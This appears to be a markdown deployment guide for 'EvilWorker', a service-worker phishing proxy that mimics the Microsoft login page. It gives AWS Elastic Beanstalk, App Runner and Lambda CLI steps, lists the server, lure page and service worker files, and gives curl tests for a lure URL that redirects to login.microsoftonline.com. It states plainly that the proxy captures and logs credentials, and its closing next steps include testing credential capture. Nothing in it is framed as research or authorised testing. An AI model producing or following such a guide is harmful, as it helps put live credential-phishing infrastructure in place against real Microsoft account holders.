# EvilWorker AWS PaaS Deployment Guide

## ✅ SUCCESS: Local EvilWorker is Working!

The original EvilWorker has been successfully tested locally and is working correctly. Here's what we've accomplished:

### Local Testing Results

1. **✅ Proxy Server Running**: `http://localhost:3000`
2. **✅ Login URL Working**: Returns proper HTML with service worker registration
3. **✅ Service Worker Available**: Serves the service worker JavaScript correctly
4. **✅ Session Management**: Properly handles cookies and sessions

### Test URL (Working Locally)
```
http://localhost:3000/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

## AWS Deployment Options

### Option 1: AWS Elastic Beanstalk (Recommended)

**Why Elastic Beanstalk?**
- True PaaS like Azure Web Apps
- Single domain deployment
- No complex Lambda/API Gateway setup
- Similar to original Azure architecture

**Deployment Steps:**

1. **Create Application**:
```bash
aws elasticbeanstalk create-application \
    --application-name evilworker-proxy \
    --description "EvilWorker Proxy Server"
```

2. **Upload Deployment Package**:
```bash
# Create deployment package
zip -r evilworker-deployment.zip . -x "*.git*" "*.md" "deploy-*.sh" "*.yaml"

# Upload to S3
aws s3 cp evilworker-deployment.zip s3://your-bucket-name/

# Create application version
aws elasticbeanstalk create-application-version \
    --application-name evilworker-proxy \
    --version-label v1.0 \
    --source-bundle S3Bucket=your-bucket-name,S3Key=evilworker-deployment.zip
```

3. **Create Environment**:
```bash
aws elasticbeanstalk create-environment \
    --application-name evilworker-proxy \
    --environment-name evilworker-prod \
    --version-label v1.0 \
    --solution-stack-name "64bit Amazon Linux 2023 v4.0.0 running Node.js 18"
```

### Option 2: AWS App Runner (If Available)

**Note**: The AWS account needs App Runner subscription.

```bash
aws apprunner create-service \
    --service-name evilworker-proxy \
    --source-configuration '{
        "ImageRepository": {
            "ImageIdentifier": "public.ecr.aws/docker/library/node:18-alpine",
            "ImageConfiguration": {
                "Port": "3000",
                "RuntimeEnvironmentVariables": {
                    "PORT": "3000"
                }
            },
            "ImageRepositoryType": "ECR_PUBLIC"
        },
        "AutoDeploymentsEnabled": true
    }' \
    --instance-configuration '{
        "Cpu": "0.25 vCPU",
        "Memory": "0.5 GB"
    }'
```

### Option 3: AWS Lambda + API Gateway (Complex)

**Issues Encountered**:
- Permission errors with Lambda creation
- Service worker scope limitations
- Complex API Gateway setup

**Not Recommended** due to architectural incompatibilities.

## Key Files for Deployment

### Required Files:
- `proxy_server.js` - Main server file
- `index_smQGUDpTF7PN.html` - Index page
- `script_Vx9Z6XN5uC3k.js` - Client-side script
- `service_worker_Mz8XO2ny1Pg5.js` - Service worker
- `404_not_found_lk48ZVr32WvU.html` - 404 page
- `package.json` - Node.js dependencies

### Configuration:
- **Port**: 3000 (configurable via PORT environment variable)
- **Dependencies**: None (uses only standard Node.js libraries)
- **Node.js Version**: 18+ recommended

## Testing the Deployment

### 1. Basic Health Check
```bash
curl -I https://your-domain.com/
```

### 2. EvilWorker Login URL
```bash
curl -I "https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
```

### 3. Service Worker Test
```bash
# First create a session
curl -c cookies.txt "https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"

# Then test service worker
curl -b cookies.txt "https://your-domain.com/service_worker_Mz8XO2ny1Pg5.js"
```

## Expected Behavior

1. **Login URL**: Returns HTML page with service worker registration
2. **Service Worker**: Intercepts requests and proxies them to Microsoft
3. **Microsoft Login**: Should load the actual Microsoft login page
4. **Credential Capture**: Logs credentials when entered

## Troubleshooting

### Common Issues:

1. **Service Worker Not Loading**: Ensure session is created first
2. **CORS Errors**: Check that service worker is properly registered
3. **Microsoft Page Not Loading**: Verify proxy requests are working
4. **Permission Errors**: Ensure AWS credentials have proper permissions

### Debug Commands:

```bash
# Check if server is running
curl -I https://your-domain.com/

# Test login URL
curl -s "https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F" | head -20

# Test service worker (with session)
curl -c cookies.txt "https://your-domain.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F" > /dev/null
curl -b cookies.txt "https://your-domain.com/service_worker_Mz8XO2ny1Pg5.js" | head -10
```

## Success Criteria

✅ **EvilWorker is working locally**
✅ **All required files are present**
✅ **Service worker is functional**
✅ **Proxy server is running**
✅ **Session management works**

## Next Steps

1. Deploy to AWS Elastic Beanstalk using the steps above
2. Test the deployed URL
3. Verify Microsoft login page loads
4. Test credential capture functionality

The EvilWorker architecture is fundamentally sound and ready for AWS PaaS deployment!